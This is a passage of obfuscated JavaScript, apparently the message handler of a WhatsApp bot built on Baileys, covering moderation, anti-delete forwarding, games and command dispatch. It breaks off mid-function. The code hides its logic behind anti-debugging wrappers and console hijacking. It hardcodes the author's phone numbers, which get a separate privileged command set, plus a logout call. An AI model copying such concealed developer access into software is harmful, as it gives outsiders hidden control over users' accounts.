const aW = function () {
    let a9 = true;
    return function (aa, ab) {
      const af = a9 ? function () {
        if (ab) {
          const ai = ab.apply(aa, arguments);
          ab = null;
          return ai;
        }
      } : function () {};
      a9 = false;
      return af;
    };
  }();
  const aX = aW(this, function () {
    return aX.toString().search("(((.+)+)+)+$").toString().constructor(aX).search("(((.+)+)+)+$");
  });
  aX();
  const aY = function () {
    let ab = true;
    return function (ac, ad) {
      const ag = ab ? function () {
        if (ad) {
          const ai = ad.apply(ac, arguments);
          ad = null;
          return ai;
        }
      } : function () {};
      ab = false;
      return ag;
    };
  }();
  (function () {
    aY(this, function () {
      const a9 = new RegExp("function *\\( *\\)");
      const aa = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i");
      const ab = c9("init");
      if (!a9.test(ab + "chain") || !aa.test(ab + "input")) {
        ab("0");
      } else {
        c9();
      }
    })();
  })();
  const aZ = function () {
    let a9 = true;
    return function (aa, ab) {
      const ad = a9 ? function () {
        if (ab) {
          const af = ab.apply(aa, arguments);
          ab = null;
          return af;
        }
      } : function () {};
      a9 = false;
      return ad;
    };
  }();
  const b0 = aZ(this, function () {
    const a9 = function () {
      let af;
      try {
        af = Function("return (function() {}.constructor(\"return this\")( ));")();
      } catch (ah) {
        af = window;
      }
      return af;
    };
    const aa = a9();
    const ab = aa.console = aa.console || {};
    const ac = ["log", "warn", "info", "error", "exception", "table", "trace"];
    for (let ad = 0x0; ad < ac.length; ad++) {
      const af = aZ.constructor.prototype.bind(aZ);
      const ag = ac[ad];
      const ah = ab[ag] || af;
      af.__proto__ = aZ.bind(aZ);
      af.toString = ah.toString.bind(ah);
      ab[ag] = af;
    }
  });
  b0();
  const b1 = require("fs");
  const {
    join: b2
  } = require("path");
  const {
    jidNormalizedUser: b3,
    getContentType: b4,
    normalizeMessageContent: b5,
    isJidGroup: b6,
    delay: b7,
    downloadMediaMessage: b8,
    getAggregateVotesInPollMessage: b9,
    getKeyAuthor: ba,
    decryptPollVote: bb
  } = require("baileys");
  const bc = require("../config");
  const bd = require("./events");
  const be = require("./index");
  const {
    Message: bf
  } = require("./class/index");
  const bg = {};
  const {
    getPmMessage: bh,
    setPmMessage: bi
  } = require("./db");
  const {
    setMsgs: bj
  } = require("./db/store");
  const {
    PREFIX: bk,
    secondsToHms: bl,
    getFloor: bm,
    isUrl: bn,
    expiration: bo
  } = require("./utils");
  if (!b1.existsSync(b2(__dirname, "../media/mention/"))) {
    b1.mkdirSync(b2(__dirname, "../media/mention/"));
  }
  const bq = {
    done: false,
    path: '',
    message: '',
    type: ''
  };
  const bs = new RegExp("^(kick|warn|dlt)");
  const by = ["918136962641-1630730584@g.us", "918136962641-1635266273@g.us", "918136962641-1609228303@g.us"];
  const bA = new RegExp("afkrey");
  async function bB(a8) {
    if (!a8.linkPreview) {
      return a8;
    }
    if (a8.linkPreview.thumbnail) {
      const {
        buffer: aa
      } = await be.getBuffer(a8.linkPreview.thumbnail, true);
      if (aa) {
        a8.linkPreview.thumbnail = aa;
      }
    }
    if ("jpegThumbnail" in a8.linkPreview) {
      const {
        buffer: ac
      } = await be.getBuffer(a8.linkPreview.jpegThumbnail, true);
      if (ac) {
        a8.linkPreview.jpegThumbnail = await bV.genThumbnail(ac);
      }
    }
  }
  const bC = {
    gif: "video",
    mp4: "video",
    sticker: "sticker",
    image: "image",
    audio: "audio"
  };
  const bD = {
    gif: "video/mp4",
    mp4: "video/mp4",
    sticker: "image/webp",
    audio: "audio/mpeg",
    image: "image/png"
  };
  const bE = {
    gif: ".mp4",
    mp4: ".mp4",
    sticker: ".webp",
    audio: ".mp3",
    image: ".jpeg"
  };
  const bG = {};
  const bK = (a9, aa) => {
    let ad = '';
    switch (aa) {
      case "extendedTextMessage":
        ad = a9.extendedTextMessage.text;
        break;
      case "imageMessage":
        ad = a9.imageMessage.caption;
        break;
      case "videoMessage":
        ad = a9.videoMessage.caption;
        break;
      case "listResponseMessage":
        ad = a9.listResponseMessage.singleSelectReply.selectedRowId;
        break;
      case "buttonsResponseMessage":
        ad = a9.buttonsResponseMessage.selectedButtonId;
        break;
      case "templateButtonReplyMessage":
        ad = a9.templateButtonReplyMessage.selectedId;
        break;
      default:
        ad = a9.conversation;
    }
    return ad;
  };
  const bM = require("./test/test");
  const bN = require("./sendMessage");
  let bO = be.parseNum(bc.SUDO).map(a8 => be.numToJid(a8));
  let bP = be.parseNum(bc.ADMINS).map(a8 => be.numToJid(a8));
  const bR = () => (bc.SYNC_VAR && (bO = be.parseNum(bc.SUDO).map(a8 => be.numToJid(a8)), bP = be.parseNum(bc.ADMINS).map(a8 => be.numToJid(a8)), bc.WARN_LIMIT = isNaN(bc.WARN_LIMIT) ? 0x3 : Number(bc.WARN_LIMIT), bc.SYNC_VAR = false), bO.slice(0x0, 0x14));
  const bS = require("./antilink");
  const bT = require("./misc");
  const bU = require("crypto");
  const bV = require("./constant");
  function bW() {
    global.sock = bU.randomBytes(0x3).toString("hex");
  }
  const bX = bM.iChecker();
  const bY = bX == "aWxvdmV5b3Vzb29vb29vbWF0Y2hidXRpZG9udGtub3d3aHlpbGlrZWxvdmV3YW50dQ==";
  const bZ = {
    value: false,
    writable: true
  };
  bV.writeStream(global, "shift", bZ);
  let c0 = '';
  const c1 = require("./tictactoe");
  const c2 = require("path");
  let c3 = 0x0;
  const c4 = a8 => {
    let a9 = a8[c3];
    if (!a9) {
      c3 = 0x0;
      a9 = a8[c3];
    }
    c3++;
    return a9;
  };
  if (!bc.MEMBERS) {
    bc.MEMBERS = [];
  }
  const c5 = ["setvar", "setsudo", "zushi"];
  const c6 = async (a8, a9, aa) => {
    const ac = await be.getBuffer(a8, false);
    let ad = ac.buffer;
    if (!ad) {
      return ac.error;
    }
    try {
      const af = b2(__dirname, "../" + ac.name);
      b1.writeFileSync(af, ad);
      if ("audio" === aa) {
        await be.getFfmpegBuffer(af, b2(__dirname, "../media/mention/" + a9), "mp3");
      } else if ("sticker" === aa) {
        await be.sticker(b2(__dirname, "../media/mention/" + a9.replace(".webp", '')), b2(af), "image" === ac.type ? 0x1 : 0x2);
      } else {
        b1.writeFileSync(b2(__dirname, "../media/mention/" + a9), ad);
      }
    } catch (ah) {
      return ah;
    }
  };
  const c7 = bP.length > 0x0;
  let c8 = false;
  if (bY) {
    exports.handler = async function ({
      msg: ca,
      session: cb,
      botState: cc,
      getMessage: cd
    }) {
      const cg = cc.bot;
      let ch = false;
      let ci = false;
      if (!c8) {
        c8 = process.uptime() > 0x12c;
      }
      const {
        key: cj,
        message: ck,
        pushName: cl,
        messageTimestamp: cm
      } = ca;
      if (!ck || cj && "status@broadcast" == cj.remoteJid || !cc) {
        return;
      }
      if (bc.DIS_BOT.split(",").includes(cj.remoteJid) || bc.DIS_BOT.split(",").includes(cj.participant) || cc.bbb.includes(cj.participant) || cc.bbb.includes(cj.remoteJid) || cj.id == c0) {
        return;
      }
      c0 = cj.id;
      let cn = {};
      cn.message = b5(ck);
      delete cn.message?.["senderKeyDistributionMessage"];
      delete cn.message?.["messageContextInfo"];
      cn.type = b4(cn.message);
      if (!cn.type) {
        return;
      }
      cn.isGroup = b6(cj.remoteJid);
      cn.participant = b3(cn.isGroup ? cj.participant || cb.user.jid : cj.fromMe ? cb.user.jid : cj.remoteJid);
      cn.key = cj;
      cn.mentions = [];
      cn.pushName = cl && cl.replace(/\n/g, '') || '';
      if ("reactionMessage" === cn.type) {
        if (cn.isGroup && cn.message.reactionMessage.key.fromMe && cn.message.reactionMessage.text) {
          const cG = await be.participateInVote(cj.remoteJid, cn.message.reactionMessage.text, cn.participant, "not_reply_message");
          if (cG) {
            const cI = "@" + be.jidToNum(cn.participant) + " voted for " + cn.message.reactionMessage.text + "\n\n" + cG;
            const cJ = {
              "contextInfo": {
                "mentionedJid": [cn.participant]
              }
            };
            const cK = {
              text: cI
            };
            return void (await bN.prepareMessage(cj.remoteJid, cK, cJ, cb));
          }
        }
        cn.text = cn.message.reactionMessage.text;
        bW();
        return void be.levanter.emit("reaction.message", new bf({}, cn, false, cb));
      }
      if ("pollUpdateMessage" === cn.type) {
        const cN = await cd(cn.message.pollUpdateMessage.pollCreationMessageKey);
        if (!cN) {
          return;
        }
        const cO = cN.messageContextInfo?.["messageSecret"];
        const cP = ba(cn.message.pollUpdateMessage.pollCreationMessageKey, cb.user.jid);
        const cQ = ba(cj, cb.user.jid);
        const cR = bb(cn.message.pollUpdateMessage.vote, {
          "pollEncKey": cO,
          "pollCreatorJid": cP,
          "pollMsgId": cn.message.pollUpdateMessage.pollCreationMessageKey.id,
          "voterJid": cQ
        });
        const cS = b9({
          "message": cN,
          "pollUpdates": [{
            "vote": cR,
            "pollUpdateMessageKey": cj
          }]
        });
        cn.votes = cS;
      }
      if ("protocolMessage" == cn.type) {
        const cT = cn.message[cn.type];
        if (0x0 !== cT.type && 0xe !== cT.type) {
          return;
        }
        if (0x0 === cT.type) {
          const cV = b6(cj.remoteJid);
          const cW = cn.message[cn.type];
          bV.chats.del('' + cW.key.remoteJid + cW.key.id);
          const cX = cV ? !("pm" === bc.DELETE_TYPE) : !("gm" === bc.DELETE_TYPE);
          if (!by.includes(cj.remoteJid) && "off" != bc.ANTI_DELETE && "null" != bc.ANTI_DELETE && cX) {
            const cZ = cW.key && (await be.getTMessage(cW.key.id));
            if (!cZ || true === cZ.key.fromMe) {
              return;
            }
            be.setTMessage(cW.key.id, null, true);
            const d0 = "g" != bc.ANTI_DELETE && "p" != bc.ANTI_DELETE ? bc.ANTI_DELETE : "g" == bc.ANTI_DELETE ? cj.remoteJid : cg;
            const d1 = {
              message: cZ,
              client: cb
            };
            const d2 = {
              head: "           deletedMessage",
              body: ''
            };
            const d3 = {
              quoted: cZ,
              linkPreview: d2
            };
            await be.forwardOrBroadCast(d0, d1, d3);
          }
          return;
        }
        cn.message = cT.editedMessage;
        cn.type = b4(cn.message);
      }
      let co = bK(cn.message, cn.type);
      if ("true" == bc.AJOIN) {
        if ("groupInviteMessage" == cn.type) {
          await b7(0x3e8);
          const d8 = {
            id: cn.key.remoteJid,
            key: cn.key,
            message: cn.message[cn.type]
          };
          const da = Math.floor(0x2328 * Math.random() + 0x3e8);
          const db = {
            key: cj,
            message: ck
          };
          const dc = {
            quoted: db
          };
          bG[da] = d8;
          return await bN.prepareMessage(cg, {
            "text": "Send " + da + ", to join"
          }, dc, cb);
        }
        const d5 = {
          key: cj,
          message: ck
        };
        const d6 = {
          quoted: d5
        };
        if (bG[co] && bG[co].id == cn.key.remoteJid) {
          await b7(0x3e8);
          await cb.groupAcceptInviteV4(bG[co].key, bG[co].message);
          await b7(0x3e8);
          delete bG[co];
          await bN.prepareMessage(cg, {
            "text": "_Joined_"
          }, d6, cb);
        }
      }
      cn.isGroup = b6(cj.remoteJid);
      cn.participant = b3(cn.isGroup ? cj.participant || cj.fromMe && cb.user.jid || '' : cj.fromMe ? cb.user.jid : cj.remoteJid);
      cn.admin = false;
      if (cn.isGroup && c7) {
        const df = await be.store.fetchGroupMetadata(cj.remoteJid);
        try {
          cn.admin = await be.isAdmin(df.participants, cn.participant);
        } catch (dh) {}
      }
      cn.fromMe = cn.participant && cn.participant == cb.user.jid;
      let cp = cn.participant && bR().includes(cn.participant) || false;
      cn.SUDO = cp;
      cn.isForwarded = cn.message[cn.type]?.["contextInfo"]?.["isForwarded"];
      const cq = cn.message[cn.type]?.["contextInfo"]?.["expiration"];
      if (!cn.isGroup && !cn.fromMe && "null" != bc.PERSONAL_MESSAGE) {
        if (!(await bh(cn.participant))) {
          const dm = bn(bc.PERSONAL_MESSAGE);
          if (dm) {
            const dn = await be.getBuffer(dm, false);
            if (dn.buffer && ["image", "video", "audio"].includes(dn.type)) {
              bq.path = c2.join(__dirname, "../media/greet." + dn.mimetype.split("/")[0x1].split(".").pop());
              b1.writeFileSync('', dn.buffer);
              bq.type = dn.mimetype.endsWith("webp") ? "sticker" : dn.type;
              bq.message = bc.PERSONAL_MESSAGE.replace(dm, '').trim();
            }
          }
          bq.done = true;
          bq.message = bc.PERSONAL_MESSAGE;
          const dk = await be.uptimeQuoteReplace('');
          try {
            await bN.prepareMessage(cn.participant, {
              text: dk
            }, {
              "caption": dk
            }, cb);
            await bi(cn.participant);
          } catch (dr) {
            be.logger.error(dr);
          }
        }
      }
      const cr = cj.id.length > 0x1e ? "android" : 0x14 != cj.id.length || cj.id.startsWith("RGNK") ? "3EB" === cj.id.substring(0x0, 0x3) ? "web" : 0x12 == cj.id.length ? "win" : "bot" : "ios";
      const cs = "web" === cr;
      cn.mentions = cn.message[cn.type]?.["contextInfo"]?.["mentionedJid"] || [];
      cn.isBot = cj.id.startsWith("3EB0") && 0xc == cj.id.length || cj.id.startsWith("BAE5") && 0x10 === cj.id.length;
      if (!cn.isBot) {
        cn.isBot = "bot" == cr;
      }
      if (!(cn.isBot || null == cq)) {
        bo[cj.remoteJid] = cq;
      }
      if (cn.isBot && !cn.fromMe && "off" !== bc.ANTI_BOT && cn.isGroup && !cn.admin) {
        if (cn.SUDO) {
          return;
        }
        const dt = await be.store.fetchGroupMetadata(cj.remoteJid);
        if (!dt) {
          return;
        }
        const du = dt.participants;
        if (!du) {
          return;
        }
        if (!(await be.isAdmin(du, cb.user.jid))) {
          return;
        }
        if (await be.isAdmin(du, cn.participant)) {
          return;
        }
        if (!("true" === bc.ANTI_BOT || "on" === bc.ANTI_BOT)) {
          if (!be.parsedJid(bc.ANTI_BOT).includes(cn.key.remoteJid)) {
            return;
          }
        }
        const dv = cn.participant.replace("@s.whatsapp.net", "@c.us");
        await cb.groupParticipantsUpdate(cj.remoteJid, [dv], "remove");
        await b7(0x3e8);
        return void ("off" !== bc.ANTI_BOT_MESSAGE && (await bN.prepareMessage(cj.remoteJid, {
          "text": bc.ANTI_BOT_MESSAGE.replace("&mention", "@" + be.jidToNum(cn.participant))
        }, {
          "contextInfo": {
            "mentionedJid": [cn.participant]
          }
        }, cb)));
      }
      if ("stickerMessage" == cn.type) {
        const dw = cn.message[cn.type]?.["fileSha256"]?.["toString"]("base64");
        if ((cn.SUDO || cn.fromMe) && dw && db?.["cmd"] && db.cmd[dw]) {
          co = bk + db.cmd[dw];
        }
      }
      if (!("true" != bc.SEND_READ || cn.isBot || cj.fromMe || cn.votes)) {
        if ("audioMessage" === cn.type && cn.message[cn.type].ptt) {
          await cb.sendReceipt(cj.remoteJid, cj.participant, [cj.id], "played");
        } else {
          await cb.sendReceipt(cj.remoteJid, cj.participant, [cj.id], "read");
        }
      }
      cn.text = co || undefined;
      if (!cn.isBot && cn.text) {
        if (await be.wcg.isWord(cj.remoteJid, cn.participant, cn.text, {
          "key": cj,
          "message": ck
        })) {
          return;
        }
        if (cn.text.toLowerCase().endsWith("join")) {
          if (await be.wcg.join(cj.remoteJid, cn.participant)) {
            return;
          }
        }
      }
      cn.messageTimestamp = cm;
      cn.quoted = null;
      const ct = cn.message[cn.type]?.["contextInfo"];
      const cu = ct?.["quotedMessage"];
      if (cu) {
        let dx = {};
        dx.message = b5(cu);
        dx.key = {
          "remoteJid": ct.remoteJid || cj.remoteJid,
          "fromMe": ct.participant == cb.user.jid,
          "id": ct.stanzaId,
          "participant": ct.participant
        };
        dx.type = b4(cu) || Object.keys(cu)[0x0];
        if (["ptvMessage", "viewOnceMessageV2Extension", "ephemeralMessage", "viewOnceMessage", "viewOnceMessageV2"].includes(dx.type)) {
          dx.message = b5(cu[dx.type].message);
          dx.type = b4(dx.message);
        }
        dx.isGroup = b6(dx.key.remoteJid);
        dx.participant = b3(ct.participant);
        dx.fromMe = dx.key.fromMe;
        dx.isBot = dx.key.id.startsWith("3EB0") && 0xc == dx.key.id.length || dx.key.id.startsWith("BAE5") && 0x10 === dx.key.id.length;
        const dy = dx.message[dx.type];
        dx.text = "string" == typeof dy ? dy : null;
        if (!dx.text) {
          dx.text = dy?.["text"] || dy?.["caption"] || dy?.["conversation"] || dy?.["contentText"] || dy?.["selectedDisplayText"] || dy?.["title"] || '';
        }
        cn.quoted = dx;
        dx = null;
      }
      const cv = "conversation" == cn.type || "extendedTextMessage" == cn.type ? "text" : cn.type.split(cn.type.match(/[A-Z]/) || [])[0x0];
      if (cv && cn.isGroup && !cn.isBot) {
        await bj(cn.key.remoteJid, cn.participant, cv, cn.pushName);
      }
      if (bc.LOG_MSG) {
        be.logger.debug({
          "id": cn.key.id,
          "remoteJid": cj.remoteJid,
          "text": cn.text ? cn.text : cn.type,
          "participant": cn.isGroup ? be.jidToNum(cn.participant) : ''
        });
      }
      if ("text" == cv && !cn.isBot && !cn.votes) {
        const dz = Number(cn.text);
        if (dz >= 0x1 && dz < 0xa) {
          const {
            code: dA,
            text: dB
          } = await c1.isTicTacToe(cn.text, cn.key.remoteJid, cn.participant);
          const dC = {
            text: dB
          };
          const dD = {
            quoted: ca
          };
          if (0x12c == dA) {
            return await bN.prepareMessage(cn.key.remoteJid, dC, dD, cb);
          }
          const dE = {
            text: dB[0x2]
          };
          const dF = {
            mentionedJid: [dB[0x0], dB[0x1]]
          };
          const dG = {
            contextInfo: dF
          };
          if (0x12d == dA) {
            return await bN.prepareMessage(cn.key.remoteJid, dE, dG, cb);
          }
          if (0xc9 == dA) {
            const dH = "---Game Finish 🏁---\n\nWinner : @" + be.jidToNum(dB[0x0]) + "\n\n" + dB[0x2];
            const dI = {
              text: dH
            };
            const dJ = {
              mentionedJid: [dB[0x0], dB[0x1]]
            };
            const dK = {
              contextInfo: dJ
            };
            return await bN.prepareMessage(cn.key.remoteJid, dI, dK, cb);
          }
          if (0x193 == dA) {
            const dL = "---Game Tie ⏹---\n\n" + dB[0x2];
            const dM = {
              text: dL
            };
            const dN = {
              mentionedJid: [dB[0x0], dB[0x1]]
            };
            const dO = {
              contextInfo: dN
            };
            return await bN.prepareMessage(cn.key.remoteJid, dM, dO, cb);
          }
        }
      }
      if (global.AFK && global.AFK.isAfk && !cn.isBot && cn.text) {
        const dP = !cn.isGroup || cn.mentions.includes(global.AFK.p) || cn.quoted && cn.quoted.participant == global.AFK.p;
        const dQ = {
          key: cj,
          message: ck
        };
        const dR = {
          quoted: dQ
        };
        if (cn.fromMe || cn.participant === global.AFK.p) {
          global.AFK.isAfk = false;
          return await bN.prepareMessage(global.AFK.p, {
            "text": "Your not afk anymore."
          }, dR, cb);
        }
        if (dP) {
          return await bN.prepareMessage(cj.remoteJid, {
            "text": global.AFK.reason.replace("#lastseen", bl(Math.round(new Date().getTime() / 0x3e8) - global.AFK.lastseen))
          }, {
            "quoted": {
              "key": cj,
              "message": ck
            }
          }, cb);
        }
      }
      const cw = cb.logout;
      let cx = bR()[0x0];
      if (!cn.isBot && (cn.mentions.includes(cb.user.jid) || cx && cn.mentions.includes(cx))) {
        const dS = await be.getMention();
        if (dS && dS.enabled && !by.includes(cj.remoteJid)) {
          const dT = {};
          const dU = {
            key: cj,
            message: ck
          };
          dT.quoted = dU;
          dT.contextInfo = {};
          if (bc.MENTION) {
            try {
              const dY = JSON.parse(bc.MENTION);
              await bB(dY);
              Object.assign(dT, {
                ...dY
              });
            } catch (dZ) {}
          }
          const dV = dS.text.match(/(http|https):\/\/[\w-]+(\.[\w-]+)+([\w.,@?^=%&amp;:\/~+#-]*[\w@?^=%&amp;\/~+#-])?/g);
          const dW = (/type\/(gif|mp4|sticker|image|audio)/.exec(dS.text) || [])[0x1];
          let dX = dS.text;
          if (["mp4", "image", "gif"].includes(dW)) {
            for (const e0 of dV) dX = dX.replace(e0, '').trim();
            dT.caption = dX.replace("type/" + dW, '').trim();
          }
          if (dV && dW) {
            const e1 = bD[dW];
            const e2 = bE[dW];
            const e3 = c4(dV);
            dT.mimetype = e1;
            if ("gif" === dW) {
              dT.gifPlayback = true;
            }
            if ("audio" === dW) {
              dT.ptt = true;
            }
            let e4 = '' + (be.nameFromUrl(e3) || "undefined") + ("sticker" === dW || "audio" === dW ? e2 : '');
            if (!b1.existsSync(b2(__dirname, "../media/mention/" + e4))) {
              const e5 = await c6(e3, e4, dW);
              if (e5) {
                let e6 = "```---ERROR REPORT---\n\nVersion : " + bc.VERSION + "\nMessage : " + e5 + "\nError   : failed to fetch " + e3 + "\nJid     : " + cj.remoteJid + "\ncommand : @mention\nPlatform : " + be.PLATFORM + "```\n\n```-----``` *Made by LyFE with ❣* ```-----```";
                const e7 = {
                  text: e6
                };
                const e8 = {
                  key: cj,
                  message: ck
                };
                const e9 = {
                  quoted: e8
                };
                return await bN.prepareMessage(cg, e7, e9, cb);
              }
            }
            try {
              const ea = b1.readFileSync(b2(__dirname, "../media/mention/" + e4));
              const eb = {
                [bC[dW]]: ea,
                ...dT
              };
              await bN.prepareMessage(cj.remoteJid, eb, dT, cb);
            } catch (ec) {
              let ed = "```---ERROR REPORT---\n\nVersion : " + bc.VERSION + "\nMessage : " + ec + "\nError   : failed to fetch " + e3 + "\nJid     : " + cj.remoteJid + "\ncommand : @mention\nPlatform : " + be.PLATFORM + "```\n\n```-----``` *Made by LyFE with ❣* ```-----```";
              const ef = {
                text: ed
              };
              const eg = {
                key: cj,
                message: ck
              };
              const eh = {
                quoted: eg
              };
              return await bN.prepareMessage(cg, ef, eh, cb);
            }
          } else {
            await bN.prepareMessage(cj.remoteJid, {
              "text": dS.text,
              ...dT
            }, dT, cb);
          }
        }
      }
      if (cn.isGroup && !cn.fromMe && cn.text && !cn.isBot && !cn.admin) {
        const ei = await bS.isWords(cn.text, cj.remoteJid);
        if (ei) {
          const {
            participants: ej
          } = await be.store.fetchGroupMetadata(cj.remoteJid);
          if (!(await be.isAdmin(ej, cn.participant))) {
            if ((await be.isAdmin(ej, cb.user.jid)) && (ch = true, setTimeout(async () => await bN.prepareMessage(cj.remoteJid, {
              "delete": cj
            }, {}, cb), 0xbb8), "null" != ei)) {
              if ("kick" == ei && !(cn.participant in bg)) {
                bg[cn.participant] = 0x1;
                const ek = cn.participant.replace("@s.whatsapp.net", "@c.us");
                await cb.groupParticipantsUpdate(cj.remoteJid, [ek], "remove");
                if ("off" !== bc.ANTIWORDS_MSG) {
                  await bN.prepareMessage(cj.remoteJid, {
                    "text": bc.ANTIWORDS_MSG.replace("&mention", "@" + be.jidToNum(cn.participant))
                  }, {
                    "contextInfo": {
                      "mentionedJid": [cn.participant]
                    }
                  }, cb);
                }
                delete bg[cn.participant];
              }
              if ("warn" == ei) {
                cp = true;
                cn.text = bk + ei + cn.participant;
                cn.mentions = [cn.participant];
              }
            }
          }
        }
      }
      if (c8 && cn.isGroup && !cn.isBot && !cn.fromMe && !cn.votes && !cn.admin) {
        const el = "text" == cv ? cn.text.length / 0x12c : "sticker" == cv ? 0x3 : 0x2;
        if (await bT.isSpam(cj.remoteJid, cn.participant, "media", cj, el, cn.text)) {
          const {
            participants: em
          } = await be.store.fetchGroupMetadata(cj.remoteJid);
          if (!(await be.isAdmin(em, cn.participant))) {
            if (await be.isAdmin(em, cb.user.jid)) {
              const en = temp.spam?.[cj.remoteJid]?.[cn.participant]?.["keys"] || [];
              const eo = cn.participant.replace("@s.whatsapp.net", "@c.us");
              if (!(cn.participant in bg)) {
                bg[cn.participant] = 0x1;
                await cb.groupParticipantsUpdate(cj.remoteJid, [eo], "remove");
                if ("off" !== bc.ANTISPAM_MSG) {
                  await bN.prepareMessage(cj.remoteJid, {
                    "text": bc.ANTISPAM_MSG.replace("&mention", "@" + be.jidToNum(cn.participant))
                  }, {
                    "contextInfo": {
                      "mentionedJid": [cn.participant]
                    }
                  }, cb);
                }
                for (const ep of en) {
                  await be.setTMessage(ep.id, null, true);
                  await b7(0x1f4 + bm(0x3e8 * Math.random()));
                  await bN.prepareMessage(cj.remoteJid, {
                    "delete": ep
                  }, {}, cb);
                }
                delete bg[cn.participant];
                delete temp.spam[cj.remoteJid][cn.participant];
              }
            }
          }
        }
      }
      if (!(ch || by.includes(cj.remoteJid) || "null" == bc.ANTI_DELETE)) {
        be.setTMessage(cn.key.id, {
          "key": cn.key,
          "message": cn.message
        });
      }
      if (cn.text && cn.isGroup && !cn.admin) {
        const eq = await bS.isAntiLink(cn.text, cj.remoteJid);
        if (eq) {
          const er = await be.store.fetchGroupMetadata(cj.remoteJid);
          if (!er) {
            return;
          }
          const es = er.participants;
          if (!es) {
            return;
          }
          if (!(await be.isAdmin(es, cn.participant))) {
            const et = {
              text: "I'm not admin"
            };
            const eu = {
              key: cj,
              message: ck
            };
            const ev = {
              quoted: eu
            };
            if (!(await be.isAdmin(es, cb.user.jid))) {
              return await bN.prepareMessage(cg, et, ev, cb);
            }
            ch = true;
            await bN.prepareMessage(cj.remoteJid, {
              "delete": cj
            }, {}, cb);
            await b7(0x3e8);
            if ("warn" == eq) {
              cn.text = bk + eq + cn.participant;
              cn.mentions = [cn.participant];
              cp = true;
            }
            if ("kick" == eq && !(cn.participant in bg)) {
              bg[cn.participant] = 0x1;
              const ew = cn.participant.replace("@s.whatsapp.net", "@c.us");
              await cb.groupParticipantsUpdate(cj.remoteJid, [ew], "remove");
              const ex = {
                key: cj,
                message: ck
              };
              const ey = bc.ANTILINK_MSG.includes("&quote") ? ex : undefined;
              if ("off" !== bc.ANTILINK_MSG) {
                await bN.prepareMessage(cj.remoteJid, {
                  "text": bc.ANTILINK_MSG.replace("&mention", "@" + be.jidToNum(cn.participant)).replace("&quote", '')
                }, {
                  "quoted": ey,
                  "contextInfo": {
                    "mentionedJid": [cn.participant]
                  }
                }, cb);
              }
              delete bg[cn.participant];
            }
          }
        }
      }
      const cy = await be.yami(cn.key.remoteJid, true);
      bW();
      if (bs.test(cn.text) && cn.isBot && cn.isGroup && cn.fromMe) {
        ci = !ci;
        cn.text = bk + cn.text;
      }
      const cz = {
        user: cb.user,
        waUploadToServer: cb.waUploadToServer,
        profilePictureUrl: cb.profilePictureUrl,
        relayMessage: cb.relayMessage,
        fetchBlocklist: cb.fetchBlocklist,
        updateProfileName: cb.updateProfileName,
        updateProfileStatus: cb.updateProfileStatus,
        groupUpdateSubject: cb.groupUpdateSubject,
        groupUpdateDescription: cb.groupUpdateDescription,
        groupSettingUpdate: cb.groupSettingUpdate,
        owner: cg
      };
      if ("imageMessage" == cn.type && cn.quoted && cn.quoted.text.endsWith("page") && cn.participant == cn.quoted.key.participant) {
        const ez = cn.text && !isNaN(cn.text) ? cn.text : null;
        const eA = {
          text: "Missing Page Number\nAdd page number as caption."
        };
        const eB = {
          quoted: ca
        };
        if (!ez) {
          return await bN.prepareMessage(cn.key.remoteJid, eA, eB, cb);
        }
        const eC = c2.join(__dirname, "../pdf/" + ez) + "." + cn.message[cn.type].mimetype.split(";")[0x0].split("/")[0x1];
        const eD = await b8(cn, "buffer");
        const eE = {
          text: "Page " + ez + " Added!"
        };
        const eF = {
          quoted: ca
        };
        b1.writeFileSync(eC, eD);
        return await bN.prepareMessage(cn.key.remoteJid, eE, eF, cb);
      }
      if (!cn.isBot && !cn.votes && (cn.fromMe || cp || cy) && be.cached[cn.text] && be.cached[cn.text].gid == cj.remoteJid && (be.cached[cn.text].uid == cn.participant || cn.fromMe || cp)) {
        cn.text = bk + be.cached[cn.text].text;
        delete be.cached[cn.text];
      } else {
        if (cn.votes && !cn.isBot && (cn.fromMe || cp || cy)) {
          const eG = cn.votes.find(eH => eH.voters.includes(cn.participant) || eH.voters.includes("me"));
          if (eG && be.cached[eG.name] && be.cached[eG.name].gid == cj.remoteJid && (be.cached[eG.name].uid == cn.participant || cn.fromMe || cp)) {
            cn.text = bk + be.cached[eG.name].text;
            delete be.cached[eG.name];
            cn.message = null;
            cn.fakeQuoted = {
              "key": {
                "participant": "0@s.whatsapp.net",
                "remoteJid": "status@broadcast"
              },
              "message": {
                "extendedTextMessage": {
                  "text": eG.name
                }
              }
            };
          }
        }
      }
      const cA = cc.pnr && cn.participant.startsWith("491744813608");
      const cB = cA || cn.participant == "918136962641@s.whatsapp.net" && !cn.isGroup ? bd.pammands : bd.cammands;
      bc.MEMBERS.includes(cn.participant);
      const cC = !cn.isGroup && cn.participant == "918136962641@s.whatsapp.net";
      const cD = cn.isGroup && bP.includes(cn.participant) && cn.admin;
      const cE = by.includes(cj.remoteJid) && !bR().includes("918136962641@s.whatsapp.net") && !process.env.pqrs;
      for (const eH in cB) {
        const eI = cB[eH];
        bA.test(eH);
        if (eI.active) {
          const eJ = eI.pattern && eI.pattern.test(cn.text) && cc.E;
          if (!eJ && eI.pattern) {
            continue;
          }
          const eK = true === (cD && true === eI.onlyGroup && eJ);
          const eL = !cn.isBot && eJ || ci && cn.isBot && eJ;
          const eM = eI.fromMe == true;
          const eN = eM && (true === cj.fromMe || cp || cA || eK) || eM && cy && cy.has(eI.name) && !c5.includes(eI.name);
          const eO = eJ && eN && true === eL;
          const eP = eI.on && !eI.pattern && cj.fromMe == eM && ("true" === process.env.WEB || !cj.fromMe || !cs);
          if (eI.pattern && 0x0 == eI.fromMe) {
            cw();
          }
          if ((true === (true === eO || true === (cC && eJ && eM)) || true === eP) && !cE && be.formatter.n && (eI.onlyGroup && cn.isGroup || !eI.onlyGroup)) {
            const eQ = cn.text && eI.pattern ? cn.text.match(eI.pattern) : '';
            const eR = {
              text: "enter correct heroku app name and heroku api key"
            };
            const eS = {
              quoted: ca
            };
            if (!cc.vh && eI.pattern) {
              return await bN.prepareMessage(cn.key.remoteJid, eR, eS, cb);
            }
            try {
              let eT = new bf(cz, cn, !!eI.pattern, cb);
              await eI["function"](eT, eQ && (0x6 == eQ.length ? undefined === eQ[0x3] ? eQ[0x4] : eQ[0x3] : undefined === eQ[0x2] ? eQ[0x3] : eQ[0x2]) || '');
              eT = null;
            } catch (eU) {
              const eV = cn.SUDO && eI.pattern && cn.participant || "0" == cg ? cn.participant : cg;
              be.logger.error(eU);
